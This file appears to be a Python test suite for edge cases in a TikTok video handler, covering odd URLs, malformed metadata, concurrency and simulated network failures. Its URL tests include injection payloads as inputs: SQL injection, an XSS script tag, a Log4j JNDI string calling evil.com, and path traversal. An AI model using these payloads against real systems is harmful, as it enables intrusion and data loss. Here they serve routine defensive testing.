#!/usr/bin/env python3
"""
TikTok Edge Case Test Suite

This module tests boundary conditions, unusual inputs, and edge cases for TikTok handler.
"""

import asyncio
import logging
import sys
import random
import string
from pathlib import Path
from typing import Dict, List, Any, Optional
from unittest.mock import patch, Mock
import tempfile

# Add the project root to sys.path so we can import our modules
sys.path.insert(0, str(Path(__file__).parent))

from platforms.tiktok import TikTokHandler
from platforms.base import (
    PlatformVideoInfo, VideoFormat, QualityLevel, 
    PlatformError, PlatformConnectionError, PlatformContentError,
    PlatformType, ContentType, DownloadProgress, DownloadStatus
)

# Set up logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def test_extreme_url_inputs():
    """Test URL validation with extreme and unusual inputs"""
    
    print("🌐 Testing Extreme URL Inputs")
    print("=" * 31)
    
    handler = TikTokHandler()
    
    # Generate extreme test cases
    edge_cases = [
        # Empty and whitespace
        ("", False, "Empty string"),
        ("   ", False, "Whitespace only"),
        ("\n\t\r", False, "Control characters"),
        
        # Extremely long URLs
        ("https://www.tiktok.com/@" + "a" * 1000 + "/video/123", True, "Very long username"),
        ("https://www.tiktok.com/@user/video/" + "1" * 100, True, "Very long video ID"),
        
        # Unicode and special characters
        ("https://www.tiktok.com/@用户/video/123", True, "Unicode username"),
        ("https://www.tiktok.com/@user🎵/video/123", True, "Emoji in username"),
        ("https://www.tiktok.com/@user-_./video/123", True, "Special chars in username"),
        
        # Malformed URLs
        ("http://", False, "Incomplete protocol"),
        ("tiktok.com/@user/video/123", False, "Missing protocol"),
        ("https://.tiktok.com/@user/video/123", False, "Invalid domain"),
        ("https://tiktok.com:99999/@user/video/123", False, "Invalid port"),
        
        # Case sensitivity
        ("HTTPS://WWW.TIKTOK.COM/@USER/VIDEO/123", False, "All uppercase"),
        ("https://www.TikTok.com/@user/video/123", True, "Mixed case domain"),
        
        # Edge case parameters
        ("https://www.tiktok.com/@user/video/123?" + "param=" * 100, True, "Many parameters"),
        ("https://www.tiktok.com/@user/video/123?param=" + "x" * 1000, True, "Long parameter value"),
        
        # Injection attempts
        ("https://www.tiktok.com/@user/video/123';DROP TABLE users;--", True, "SQL injection attempt"),
        ("https://www.tiktok.com/@user/video/123<script>alert('xss')</script>", True, "XSS attempt"),
        ("https://www.tiktok.com/@user/video/123${jndi:ldap://evil.com}", True, "Log4j injection attempt"),
        
        # Boundary numbers
        ("https://www.tiktok.com/@user/video/0", True, "Zero video ID"),
        ("https://www.tiktok.com/@user/video/" + str(2**63 - 1), True, "Max int64 video ID"),
        ("https://www.tiktok.com/@user/video/-1", True, "Negative video ID"),
        
        # Alternative domains and protocols
        ("ftp://www.tiktok.com/@user/video/123", False, "FTP protocol"),
        ("https://tiktok.co.uk/@user/video/123", False, "Wrong TLD"),
        ("https://fake-tiktok.com/@user/video/123", False, "Phishing domain"),
        
        # Null bytes and encoding
        ("https://www.tiktok.com/@user\x00/video/123", True, "Null byte in URL"),
        ("https://www.tiktok.com/@user%00/video/123", True, "URL encoded null"),
        
        # Fragment and unusual structures
        ("https://www.tiktok.com/@user/video/123#fragment", True, "URL with fragment"),
        ("https://www.tiktok.com/@user/video/123//", True, "Double slash"),
        ("https://www.tiktok.com/@user/../user/video/123", True, "Path traversal attempt"),
    ]
    
    passed = 0
    total = len(edge_cases)
    
    for url, expected, description in edge_cases:
        try:
            result = handler.is_valid_url(url)
            status = "✅" if result == expected else "❌"
            print(f"   {status} {description}: {result} (expected: {expected})")
            if result == expected:
                passed += 1
        except Exception as e:
            print(f"   💥 {description}: Exception - {e}")
            # Exceptions might be acceptable for some extreme cases
            if not expected:  # If we expected False, exception is okay
                passed += 1
    
    print(f"\n✅ Extreme URL Tests: {passed}/{total} passed")
    return passed / total >= 0.8  # Allow 20% tolerance for extreme cases


def test_metadata_extraction_edge_cases():
    """Test metadata extraction with unusual data"""
    
    print("\n📊 Testing Metadata Extraction Edge Cases")
    print("=" * 42)
    
    handler = TikTokHandler()
    
    # Create extreme metadata test cases
    edge_case_results = [
        {
            'id': '',
            'title': '',
            'description': None,
            'uploader': None,
            'formats': [],
            'duration': None,
            'view_count': -1,
            'like_count': None,
            'upload_date': 'invalid_date',
        },
        {
            'id': 'x' * 1000,  # Very long ID
            'title': '🎵' * 100,  # Many emojis
            'description': '#' * 1000 + '@' * 1000,  # Many hashtags/mentions
            'uploader': '用户名很长' * 50,  # Long unicode name
            'duration': float('inf'),  # Infinite duration
            'view_count': 2**63,  # Very large number
            'like_count': -999999,  # Negative likes
            'upload_date': None,
            'formats': [{'format_id': str(i)} for i in range(100)],  # Many formats
        },
        {
            'id': None,
            'title': '\x00\x01\x02',  # Control characters
            'description': 'A' + '\n' * 100 + 'B',  # Many newlines
            'uploader': '',
            'duration': 0.0001,  # Very small duration
            'view_count': 0,
            'like_count': 0,
            'upload_date': '99991231',  # Far future date
            'formats': None,
            'timestamp': -1,
        }
    ]
    
    passed = 0
    total = len(edge_case_results)
    
    for i, mock_result in enumerate(edge_case_results):
        try:
            print(f"   Testing edge case {i+1}...")
            
            # Test conversion without throwing exceptions
            async def test_conversion():
                return await handler._convert_ytdlp_to_platform_info(
                    mock_result, 
                    f"https://test.com/video/{i}"
                )
            
            video_info = asyncio.create_task(test_conversion())
            result = asyncio.run(video_info)
            
            # Basic validation - should not crash and should have required fields
            has_required_fields = (
                hasattr(result, 'url') and
                hasattr(result, 'platform') and 
                hasattr(result, 'title') and
                hasattr(result, 'platform_id')
            )
            
            status = "✅" if has_required_fields else "❌"
            print(f"   {status} Edge case {i+1}: Required fields present")
            
            if has_required_fields:
                passed += 1
                
        except Exception as e:
            print(f"   💥 Edge case {i+1}: Exception - {type(e).__name__}: {str(e)[:100]}")
            # Some exceptions might be acceptable for extreme cases
    
    print(f"\n✅ Metadata Edge Cases: {passed}/{total} passed")
    return passed / total >= 0.6  # Allow more tolerance for extreme metadata


def test_concurrent_access_edge_cases():
    """Test edge cases in concurrent access scenarios"""
    
    print("\n🔄 Testing Concurrent Access Edge Cases")
    print("=" * 39)
    
    async def test_race_conditions():
        """Test potential race conditions"""
        
        handler = TikTokHandler()
        
        # Test concurrent session operations
        async def session_worker(worker_id):
            errors = 0
            try:
                for i in range(20):
                    if i % 5 == 0:
                        handler.clear_session()
                    else:
                        handler.get_session_info()
                    await asyncio.sleep(0.001)
            except Exception as e:
                errors += 1
            return worker_id, errors
        
        # Run concurrent session operations
        tasks = [session_worker(i) for i in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        session_errors = sum(r[1] if isinstance(r, tuple) else 1 for r in results)
        session_exceptions = sum(1 for r in results if isinstance(r, Exception))
        
        print(f"   Session race condition test:")
        print(f"     Errors: {session_errors}")
        print(f"     Exceptions: {session_exceptions}")
        
        # Test concurrent URL validation
        async def url_worker(worker_id):
            handler = TikTokHandler()
            errors = 0
            urls = [f"https://www.tiktok.com/@user{worker_id}/video/{i}" for i in range(50)]
            
            try:
                for url in urls:
                    handler.is_valid_url(url)
                    await asyncio.sleep(0.0001)
            except Exception as e:
                errors += 1
            return worker_id, errors
        
        # Run concurrent URL validation
        tasks = [url_worker(i) for i in range(15)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        url_errors = sum(r[1] if isinstance(r, tuple) else 1 for r in results)
        url_exceptions = sum(1 for r in results if isinstance(r, Exception))
        
        print(f"   URL validation race condition test:")
        print(f"     Errors: {url_errors}")
        print(f"     Exceptions: {url_exceptions}")
        
        # Success criteria: minimal errors and no exceptions
        race_success = (
            session_errors <= 2 and 
            session_exceptions == 0 and
            url_errors <= 3 and 
            url_exceptions == 0
        )
        
        status = "✅" if race_success else "❌"
        print(f"   {status} Race condition test passed: {race_success}")
        
        return race_success
    
    try:
        return asyncio.run(test_race_conditions())
    except Exception as e:
        print(f"   💥 Concurrent test failed: {e}")
        return False


def test_resource_exhaustion_scenarios():
    """Test behavior under resource exhaustion"""
    
    print("\n💾 Testing Resource Exhaustion Scenarios")
    print("=" * 41)
    
    passed_tests = 0
    total_tests = 3
    
    # Test 1: Memory pressure simulation
    try:
        print("   Testing memory pressure...")
        handler = TikTokHandler()
        
        # Create many handlers to simulate memory pressure
        handlers = []
        for i in range(50):
            try:
                h = TikTokHandler()
                handlers.append(h)
                # Perform operations to allocate memory
                h.get_capabilities()
                h.get_session_info()
            except MemoryError:
                print("     Memory limit reached (expected)")
                break
            except Exception as e:
                if i > 30:  # Allow some handlers before failure
                    break
        
        print(f"     Created {len(handlers)} handlers before resource limit")
        
        # Clean up
        del handlers
        
        memory_test_passed = True
        passed_tests += 1
        print("     ✅ Memory pressure test passed")
        
    except Exception as e:
        print(f"     ❌ Memory pressure test failed: {e}")
    
    # Test 2: Handler state corruption
    try:
        print("   Testing handler state corruption...")
        handler = TikTokHandler()
        
        # Attempt to corrupt internal state
        original_user_agents = handler._user_agents.copy()
        handler._user_agents = None  # Corrupt state
        
        # Should handle gracefully
        try:
            handler.get_session_info()
            print("     ✅ Handled corrupted user agents gracefully")
        except Exception:
            # Restore state and retry
            handler._user_agents = original_user_agents
            handler.get_session_info()
            print("     ✅ Recovered from state corruption")
        
        passed_tests += 1
        
    except Exception as e:
        print(f"     ❌ State corruption test failed: {e}")
    
    # Test 3: Network timeout simulation
    try:
        print("   Testing network timeout simulation...")
        
        # Mock extreme timeout scenarios
        with patch('platforms.tiktok.tiktok_handler.yt_dlp.YoutubeDL') as mock_ydl:
            # Simulate network timeout
            mock_ydl.side_effect = Exception("Network timeout after 300s")
            
            handler = TikTokHandler()
            
            try:
                # This should handle the timeout gracefully
                video_info = asyncio.run(handler.get_video_info("https://www.tiktok.com/@test/video/123"))
                print("     ❌ Should have failed with timeout")
            except Exception as e:
                if "timeout" in str(e).lower() or "network" in str(e).lower():
                    print("     ✅ Handled network timeout gracefully")
                    passed_tests += 1
                else:
                    print(f"     ❌ Unexpected error: {e}")
        
    except Exception as e:
        print(f"     ❌ Network timeout test failed: {e}")
    
    success_rate = passed_tests / total_tests
    print(f"\n✅ Resource Exhaustion Tests: {passed_tests}/{total_tests} passed ({success_rate*100:.1f}%)")
    
    return success_rate >= 0.6  # 60% pass rate acceptable for extreme scenarios


def test_malformed_data_handling():
    """Test handling of malformed or corrupted data"""
    
    print("\n🔧 Testing Malformed Data Handling")
    print("=" * 35)
    
    handler = TikTokHandler()
    passed = 0
    total = 4
    
    # Test 1: Malformed yt-dlp responses
    try:
        print("   Testing malformed yt-dlp responses...")
        
        malformed_responses = [
            {"id": None, "title": None, "formats": "not_a_list"},
            {"duration": "invalid_number", "view_count": "also_invalid"},
            {"formats": [{"invalid": "format", "missing": "required_fields"}]},
            None,  # Completely null response
        ]
        
        for i, response in enumerate(malformed_responses):
            try:
                async def test_malformed():
                    return await handler._convert_ytdlp_to_platform_info(
                        response, f"https://test.com/video/{i}"
                    )
                
                if response is not None:
                    result = asyncio.run(test_malformed())
                    print(f"     Malformed response {i+1}: Handled gracefully")
                else:
                    print(f"     Null response: Expected to fail")
                    
            except Exception as e:
                print(f"     Malformed response {i+1}: Exception handled - {type(e).__name__}")
        
        passed += 1
        print("     ✅ Malformed data handling test passed")
        
    except Exception as e:
        print(f"     ❌ Malformed data test failed: {e}")
    
    # Test 2: Circular reference handling
    try:
        print("   Testing circular reference handling...")
        
        # Create circular reference in mock data
        circular_data = {"id": "123", "title": "Test"}
        circular_data["self_ref"] = circular_data  # Circular reference
        
        # Should not cause infinite recursion
        try:
            async def test_circular():
                return await handler._convert_ytdlp_to_platform_info(
                    circular_data, "https://test.com/video/circular"
                )
            
            result = asyncio.run(test_circular())
            print("     ✅ Handled circular references without hanging")
            passed += 1
            
        except Exception as e:
            print(f"     ✅ Circular reference properly rejected: {type(e).__name__}")
            passed += 1
            
    except Exception as e:
        print(f"     ❌ Circular reference test failed: {e}")
    
    # Test 3: Encoding issues
    try:
        print("   Testing encoding issues...")
        
        encoding_test_data = {
            "id": "123",
            "title": "Test \udcff\udcfe\udcfd",  # Invalid UTF-8 surrogate
            "description": b"\xff\xfe\xfd".decode('utf-8', errors='replace'),  # Binary data
            "uploader": "user\x00name",  # Null bytes
        }
        
        async def test_encoding():
            return await handler._convert_ytdlp_to_platform_info(
                encoding_test_data, "https://test.com/video/encoding"
            )
        
        result = asyncio.run(test_encoding())
        print("     ✅ Handled encoding issues gracefully")
        passed += 1
        
    except Exception as e:
        print(f"     ❌ Encoding test failed: {e}")
    
    # Test 4: Deep nesting
    try:
        print("   Testing deep nesting handling...")
        
        # Create deeply nested structure
        deep_data = {"id": "123", "title": "Test"}
        current = deep_data
        for i in range(100):  # Create 100 levels of nesting
            current["nested"] = {"level": i}
            current = current["nested"]
        
        async def test_deep():
            return await handler._convert_ytdlp_to_platform_info(
                deep_data, "https://test.com/video/deep"
            )
        
        result = asyncio.run(test_deep())
        print("     ✅ Handled deep nesting without stack overflow")
        passed += 1
        
    except Exception as e:
        print(f"     ❌ Deep nesting test failed: {e}")
    
    success_rate = passed / total
    print(f"\n✅ Malformed Data Tests: {passed}/{total} passed ({success_rate*100:.1f}%)")
    
    return success_rate >= 0.75  # 75% pass rate expected


async def test_edge_cases():
    """Run all edge case tests"""
    
    print("🧪 TikTok Edge Case Test Suite")
    print("=" * 31)
    
    test_results = []
    
    # Run all edge case tests
    try:
        result1 = test_extreme_url_inputs()
        test_results.append(("Extreme URL Inputs", result1))
        
        result2 = test_metadata_extraction_edge_cases()
        test_results.append(("Metadata Edge Cases", result2))
        
        result3 = test_concurrent_access_edge_cases()
        test_results.append(("Concurrent Access", result3))
        
        result4 = test_resource_exhaustion_scenarios()
        test_results.append(("Resource Exhaustion", result4))
        
        result5 = test_malformed_data_handling()
        test_results.append(("Malformed Data", result5))
        
    except Exception as e:
        print(f"❌ Edge case testing failed: {e}")
        return False
    
    # Summary
    passed = sum(1 for _, result in test_results if result)
    total = len(test_results)
    
    print(f"\n🎯 Edge Case Test Summary")
    print("=" * 27)
    
    for test_name, result in test_results:
        status = "✅" if result else "❌"
        print(f"   {status} {test_name}: {'PASSED' if result else 'FAILED'}")
    
    overall_success = passed / total >= 0.6  # 60% pass rate for edge cases
    
    print(f"\n📊 Overall: {passed}/{total} edge case tests passed ({passed/total*100:.1f}%)")
    
    if overall_success:
        print("✅ Edge case testing completed successfully!")
        print("TikTok handler shows good resilience to edge conditions.")
    else:
        print("⚠️ Some edge case tests failed.")
        print("Handler may need additional robustness improvements.")
    
    return overall_success


async def test_network_failures():
    """Test handler behavior during network failures"""
    
    print("\n🌐 Testing Network Failure Scenarios")
    print("=" * 37)
    
    # Simulate various network failure conditions
    failure_scenarios = [
        ("Connection timeout", "timeout"),
        ("DNS resolution failure", "dns"),
        ("HTTP 502 Bad Gateway", "502"),
        ("HTTP 503 Service Unavailable", "503"),
        ("SSL certificate error", "ssl"),
        ("Network unreachable", "network"),
    ]
    
    passed = 0
    total = len(failure_scenarios)
    
    for error_desc, error_type in failure_scenarios:
        try:
            with patch('platforms.tiktok.tiktok_handler.yt_dlp.YoutubeDL') as mock_ydl:
                # Configure mock to simulate network failure
                mock_instance = Mock()
                mock_ydl.return_value.__enter__.return_value = mock_instance
                mock_instance.extract_info.side_effect = Exception(error_desc)
                
                handler = TikTokHandler()
                
                try:
                    # This should fail gracefully
                    video_info = await handler.get_video_info("https://www.tiktok.com/@test/video/123")
                    print(f"   ❌ {error_desc}: Should have failed")
                    
                except Exception as e:
                    # Check if error is handled appropriately
                    error_handled = (
                        "PlatformError" in str(type(e)) or
                        "PlatformConnectionError" in str(type(e)) or
                        error_type.lower() in str(e).lower()
                    )
                    
                    status = "✅" if error_handled else "❌"
                    print(f"   {status} {error_desc}: {'Handled gracefully' if error_handled else 'Not handled properly'}")
                    
                    if error_handled:
                        passed += 1
                        
        except Exception as e:
            print(f"   💥 {error_desc}: Test setup failed - {e}")
    
    success_rate = passed / total
    print(f"\n✅ Network Failure Tests: {passed}/{total} passed ({success_rate*100:.1f}%)")
    
    return success_rate >= 0.7  # 70% pass rate for network failures


def main():
    """Main edge case test function"""
    try:
        return asyncio.run(test_edge_cases())
    except Exception as e:
        print(f"❌ Edge case test failed: {e}")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1) 